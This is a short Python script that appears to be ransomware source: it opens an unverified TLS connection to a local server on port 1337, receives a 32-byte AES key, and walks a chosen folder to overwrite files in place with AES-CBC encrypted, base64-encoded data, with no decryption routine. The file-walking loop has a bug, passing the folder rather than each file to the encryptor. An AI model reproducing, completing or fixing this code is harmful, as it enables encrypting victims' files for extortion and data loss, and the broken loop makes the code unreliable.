import socket
import base64
import ssl
from Crypto.Cipher import AES
from Crypto import Random
import os

def scan_and_encrypt(key,root_dir):
    for root,dirs,files in os.walk(root_dir):
        for file in files:
            encrypt_file(key , root_dir)  

def encrypt(key,raw):
    raw = pad(raw)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key,AES.MODE_CBC,iv)
    encrypted_text = cipher.encrypt(raw)
    return base64.b64encode(iv+encrypted_text)

def encrypt_file(key,file_path):
    plaintext=read_file(file_path)
    encrypted_text = encrypt(key,plaintext)
    write_file(file_path,encrypted_text)
    
def read_file(path):
    with open(path,"rb") as file:
        plaintext = file.read()
        return plaintext

def write_file(path, content):
    with open(path,"wb") as encrypted_file:
        encrypted_file.write(content)


def pad(data:bytes,block_size: int=16) -> bytes:
    pad_len=block_size-(len(data)%block_size)
    if pad_len==0: pad_len=block_size
    return data+bytes([pad_len])*pad_len


if __name__ == "__main__":
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    context = ssl._create_unverified_context()
    sock.connect(("127.0.0.1",1337))
    ssl_ssock=context.wrap_socket(sock,server_side=False)
    key = ssl_ssock.recv(32)
    scan_and_encrypt(key,"replace with folder location")
    
    
